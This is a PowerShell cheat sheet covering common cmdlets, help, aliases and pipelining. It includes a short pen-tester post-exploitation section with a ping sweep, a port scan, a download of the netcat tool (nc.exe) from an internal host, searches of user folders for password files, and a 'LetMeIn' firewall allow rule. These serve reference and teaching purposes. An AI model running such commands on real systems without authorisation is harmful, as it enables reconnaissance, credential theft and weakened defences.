<# Purpose
    The purpose of this cheat sheet is to describe some common options and techniques for
    use in Microsoft’s PowerShell.
  PowerShell Overview
PowerShell Background
    PowerShell is the successor to command.com, cmd.exe and cscript. Initially released as a
    separate download, it is now built in to all modern versions of Microsoft Windows.
    PowerShell syntax takes the form of verb-noun patterns implemented in cmdlets.
Launching PowerShell
    PowerShell is accessed by pressing Start -> typing powershell and pressing enter. Some
    operations require administrative privileges and can be accomplished by launching
    PowerShell as an elevated session. You can launch an elevated PowerShell by pressing Start
    -> typing powershell and pressing Shift-CTRL-Enter.
    
#>

<#---------------Useful Cmdlets (and aliases)----------------------#>

# Get a directory listing (ls, dir, gci):
  PS C:\> Get-ChildItem

# Copy a file (cp, copy, cpi):
  Copy-Item src.txt dst.txt

# Move a file (mv, move, mi):
  Move-Item src.txt dst.txt
  
# Find text within a file:
   Select-String –path c:\users\*.txt –pattern password
   ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}

# Display file contents (cat, type, gc):
  Get-Content file.txt

# Get present directory (pwd, gl):
  Get-Location
  
# Get a process listing (ps, gps):
   Get-Process
   
# Get a service listing:
  Get-Service

# Formatting output of a command (Format-List):
  ls | Format-List –property name
  
# Paginating output:
  ls –r | Out-Host -paging
  
# Get the SHA1 hash of a file:
  Get-FileHash -Algorithm SHA1 file.txt
  
# Exporting output to CSV:
  Get-Process | Export-Csv procs.csv

<#-------------PowerShell for Pen-Tester Post-Exploitation--------------#>

# Conduct a ping sweep:
  1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}
  
# Conduct a port scan:
  1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

# Fetch a file via HTTP (wget in PowerShell):
  (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe"," nc.exe")
  
# Find all files with a particular name:
   Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt

# Get a listing of all installed Microsoft Hotfixes:
  Get-HotFix
  
# Navigate the Windows registry:
  cd HKLM:\
  ls

# List programs set to start automatically in the registry:
  Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run
  
# Convert string from ascii to Base64:
  [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))
  
# List and modify the Windows firewall rules:
  Get-NetFirewallRule –all
  New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25

<# Cmdlets are small scripts that follow a dashseparated verb-noun convention such as "Get-Process".
    Similar Verbs with Different Actions:
      New- Creates a new resource
      Set- Modifies an existing resource
      Get- Retrieves an existing resource
      Read- Gets information from a source, such as a file
      Find- Used to look for an object
      Search- Used to create a reference to a resource
      Start- (asynchronous) begin an operation, such as starting a process
      Invoke- (synchronous) perform an operation such as running a command
    Parameters:
      Each verb-noun named cmdlet may have many parameters to control cmdlet functionality.
     Objects:
      The output of most cmdlets are objects that can be passed to other cmdlets and further
      acted upon. This becomes important in pipelining cmdlets.
#>

<#------------------Finding Cmdlets---------------------#>

# To get a list of all available cmdlets:
  Get-Command

# Get-Command supports filtering. To filter cmdlets on the verb set:
  Get-Command Set*
  Get-Command –Verb Set
  
# Or on the noun process:
  Get-Command *Process
  Get-Command –Noun process
  
# Getting Help
  Get-Help
  
# To read cmdlet self documentation:
  Get-Help <cmdlet>

# Detailed help:
   Get-Help <cmdlet> -detailed
   
# Usage examples:
  Get-Help <cmdlet> -examples
  
# Full (everything) help:
  Get-Help <cmdlet> -full
  
# Online help (if available):
  Get-Help <cmdlet> -online
  
<#--------------Cmdlet Aliases-------------------#>

# To list available aliases (alias alias):
  Get-Alias
  
# To expand an alias into a full name:
  alias <unknown alias>
  alias gcm

<#--------------------Efficient PowerShe----------------------#>

# Tab completion:
  get-child<TAB>
  Get-ChildItem
  
# Parameter shortening:
  ls –recurse 
  #s equivalent to:
  ls -r
  
<#----------------5 PowerShell Essentials---------------------#>

# Shows help & examples
  Get-Help [cmdlet] -examples
  # Alias
  help [cmdlet] -examples

# Shows a list of commands
  Get-Command
  # Alias
  gcm *[string]*

# Shows properties & methods
  [cmdlet] | Get-Member
  # Alias
  [cmdlet] | gm
  
# Takes each item on pipeline and handles it as $_
  ForEach-Object { $_ }
  # Alias
  [cmdlet] | % { [cmdlet] $_ }

# Searches for strings in files or output, like grep
  Select-String
  # Alias
  sls –path [file] –pattern [string]
  
<#---------------Pipelining, Loops, and Variables--------------------#>

# Piping cmdlet output to another cmdlet:
  Get-Process | Format-List –property name
  
# ForEach-Object in the pipeline (alias %):
  ls *.txt | ForEach-Object {cat $_}

# Where-Object condition (alias where or ?):
  Get-Process | Where-Object {$_.name –eq "notepad"}
  
# Generating ranges of numbers and looping:
  1..10
  1..10 | % {echo "Hello!"}
  
# Creating and listing variables:
  $tmol = 42
  ls variable:
  
# Examples of passing cmdlet output down pipeline:

   dir | group extension | sort
   Get-Service dhcp | Stop-Service -PassThru | Set-Service-StartupType Disabled
